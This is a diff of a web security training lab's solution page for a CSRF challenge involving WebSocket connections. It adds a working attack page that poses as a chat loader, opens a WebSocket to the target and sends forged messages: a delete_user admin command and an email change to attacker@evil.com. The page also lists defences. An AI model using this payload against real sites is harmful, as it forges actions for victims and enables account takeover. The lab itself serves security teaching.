@@ -9,13 +9,13 @@
             <div class="card-header bg-success text-white">
                 <h2 class="text-center">
                     <i class="bi bi-lightbulb-fill me-2"></i>
-                    Level 20 Solution: Advanced CSRF Level 20
+                    Level 20 Solution: CSRF in WebSocket Connections
                 </h2>
             </div>
             <div class="card-body">
                 <div class="alert alert-info">
                     <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
-                    <p>This advanced CSRF challenge demonstrates modern attack techniques and bypass methods.</p>
+                    <p>This challenge demonstrates how to exploit CSRF vulnerabilities in WebSocket connections and real-time communication systems that lack proper origin validation.</p>
                 </div>
 
                 <div class="card mb-4">
@@ -23,8 +23,8 @@
                         <h4 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Required</h4>
                     </div>
                     <div class="card-body">
-                        <p><strong>Primary Tools:</strong> Burp Suite, Browser Developer Tools, Custom Scripts</p>
-                        <p><strong>Skills:</strong> CSRF exploitation, HTTP request manipulation, Web security testing</p>
+                        <p><strong>Primary Tools:</strong> Burp Suite (WebSocket support), Browser Developer Tools, Custom JavaScript</p>
+                        <p><strong>Skills:</strong> WebSocket CSRF exploitation, Real-time communication security, Origin validation bypass</p>
                     </div>
                 </div>
 
@@ -35,16 +35,64 @@
                     <div class="card-body">
                         
                         <ol>
-                            <li><strong>Reconnaissance:</strong> Analyze the target application and identify CSRF protection mechanisms</li>
-                            <li><strong>Vulnerability Assessment:</strong> Test for CSRF vulnerabilities in critical functions</li>
-                            <li><strong>Bypass Development:</strong> Develop techniques to bypass the implemented protections</li>
-                            <li><strong>Payload Crafting:</strong> Create a malicious payload that exploits the CSRF vulnerability</li>
-                            <li><strong>Attack Execution:</strong> Execute the attack and verify successful exploitation</li>
-                            <li><strong>Impact Assessment:</strong> Document the security impact and potential damage</li>
+                            <li><strong>Analyze WebSocket Endpoint:</strong> Identify the WebSocket connection endpoint and message format</li>
+                            <li><strong>Test Origin Validation:</strong> Check if the server validates the Origin header for WebSocket connections</li>
+                            <li><strong>Craft WebSocket CSRF:</strong> Create a malicious page that establishes a WebSocket connection</li>
+                            <li><strong>Message Injection:</strong> Send unauthorized messages through the WebSocket connection</li>
+                            <li><strong>Real-time Exploitation:</strong> Execute real-time actions like sending messages or updating data</li>
+                            <li><strong>Verify Impact:</strong> Confirm that unauthorized actions were performed successfully</li>
                         </ol>
                         <div class="alert alert-warning mt-3">
-                            <strong>Key Insight:</strong> Advanced CSRF attacks require understanding of modern web security mechanisms.
+                            <strong>Key Insight:</strong> WebSocket CSRF attacks bypass traditional CSRF protections because WebSockets don't follow the same-origin policy by default.
                         </div>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-success text-white">
+                        <h4 class="mb-0"><i class="bi bi-code-slash me-2"></i>WebSocket CSRF Payload</h4>
+                    </div>
+                    <div class="card-body">
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- WebSocket CSRF Attack --&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h3&gt;Loading chat...&lt;/h3&gt;
+
+    &lt;script&gt;
+    // Establish WebSocket connection to target
+    const ws = new WebSocket('ws://target.com/csrf/level20/chat');
+
+    ws.onopen = function() {
+        console.log('WebSocket connection established');
+
+        // Send unauthorized messages
+        ws.send(JSON.stringify({
+            type: 'message',
+            content: 'CSRF attack via WebSocket!',
+            recipient: 'admin'
+        }));
+
+        // Send admin command
+        ws.send(JSON.stringify({
+            type: 'admin_command',
+            action: 'delete_user',
+            target_user: 'victim123'
+        }));
+
+        // Send sensitive data modification
+        ws.send(JSON.stringify({
+            type: 'update_profile',
+            user_id: 'victim123',
+            new_email: 'attacker@evil.com'
+        }));
+    };
+
+    ws.onmessage = function(event) {
+        console.log('Response:', event.data);
+    };
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
                     </div>
                 </div>
 
@@ -53,12 +101,13 @@
                         <h4 class="mb-0"><i class="bi bi-shield-exclamation me-2"></i>Security Impact</h4>
                     </div>
                     <div class="card-body">
-                        <p>This CSRF vulnerability demonstrates how attackers can:</p>
+                        <p>WebSocket CSRF vulnerabilities allow attackers to:</p>
                         <ul>
-                            <li>Execute unauthorized actions on behalf of authenticated users</li>
-                            <li>Bypass authentication mechanisms through cross-site requests</li>
-                            <li>Potentially compromise user accounts and sensitive data</li>
-                            <li>Perform state-changing operations without user consent</li>
+                            <li>Send unauthorized real-time messages on behalf of authenticated users</li>
+                            <li>Execute admin commands through WebSocket connections</li>
+                            <li>Modify user data in real-time applications</li>
+                            <li>Bypass traditional CSRF protections that only cover HTTP requests</li>
+                            <li>Perform persistent attacks through long-lived WebSocket connections</li>
                         </ul>
                     </div>
                 </div>
@@ -69,11 +118,12 @@
                     </div>
                     <div class="card-body">
                         <ul>
-                            <li><strong>CSRF Tokens:</strong> Implement anti-CSRF tokens in all state-changing forms</li>
-                            <li><strong>SameSite Cookies:</strong> Use SameSite cookie attributes to prevent cross-site requests</li>
-                            <li><strong>Origin Validation:</strong> Verify the Origin and Referer headers</li>
-                            <li><strong>Custom Headers:</strong> Require custom headers for AJAX requests</li>
-                            <li><strong>Double Submit Cookies:</strong> Implement double submit cookie pattern</li>
+                            <li><strong>Origin Header Validation:</strong> Always validate the Origin header for WebSocket connections</li>
+                            <li><strong>Authentication Tokens:</strong> Require authentication tokens in WebSocket messages</li>
+                            <li><strong>Connection Authorization:</strong> Implement proper authorization checks during WebSocket handshake</li>
+                            <li><strong>Message Validation:</strong> Validate all incoming WebSocket messages and their sources</li>
+                            <li><strong>Rate Limiting:</strong> Implement rate limiting for WebSocket connections and messages</li>
+                            <li><strong>Secure WebSocket (WSS):</strong> Always use encrypted WebSocket connections</li>
                         </ul>
                     </div>
                 </div>
